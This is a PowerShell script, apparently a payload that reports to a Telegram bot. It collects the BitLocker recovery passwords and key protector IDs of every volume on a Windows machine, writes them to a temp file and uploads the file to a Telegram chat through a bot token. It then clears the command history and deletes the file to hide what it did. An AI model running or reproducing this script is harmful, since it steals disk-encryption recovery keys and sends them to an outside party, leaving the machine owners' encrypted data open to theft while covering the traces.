# Get-Bitlocker-Info
Set-StrictMode -Off
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$PSDefaultParameterValues['Out-File:Encoding'] = 'ascii'

$token = "YOUR_BOT_TOKEN_FOR_TELEGRAM"
$url = "https://api.telegram.org/bot$token"
$outpath = "$env:TEMP/bitlocker.txt"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

while($chatID.length -eq 0){
    $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
    if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
    if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}}
    sleep 5
}

$charCodes = @(0x2705, 0x1F4BB, 0x274C, 0x1F55C, 0x1F50D, 0x1F517, 0x23F8)
$chars = $charCodes | ForEach-Object { [char]::ConvertFromUtf32($_) }
$tick, $comp, $closed, $waiting, $glass, $cmde, $pause = $chars
Function Post-Message{$script:params = @{chat_id = $chatID ;text = $contents};Invoke-WebRequest -Uri ($url + "/sendMessage") -Method POST -Body $params | Out-Null}
Function Post-File{$filename = ($outpath).Split('\')[-1];$fileBytes = [System.IO.File]::ReadAllBytes($outpath);$fileEncoding = [System.Text.Encoding]::GetEncoding(0).GetString($fileBytes);$boundary = [System.Guid]::NewGuid().ToString(); $LF = "`r`n";$bodyLines = ( "--$boundary","Content-Disposition: form-data; name=`"chat_id`"$LF","$chatID$LF","--$boundary","Content-Disposition: form-data; name=`"document`"; filename=`"$filename`"","Content-Type: application/octet-stream$LF","$fileEncoding","--$boundary--$LF" ) -join $LF;Invoke-WebRequest -Uri ($url + "/sendDocument") -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines | Out-Null}

$contents = "$comp Gathering System BitLocker Information for $env:COMPUTERNAME $comp"
Post-Message

Get-BitLockerVolume | ForEach-Object {
$MountPoint = $_.MountPoint
$KeyProtectorId = [string]($_.KeyProtector[1]).KeyProtectorId
$RecoveryKey = [string]($_.KeyProtector).RecoveryPassword
if ($RecoveryKey.Length -gt 5) {
    Write-Output ("Volume: $MountPoint | ID: $KeyProtectorId | Key: $RecoveryKey")
    }
} | Out-File -FilePath $outpath -Append

Post-File

Clear-History
Remove-Item -Path $outpath -Force
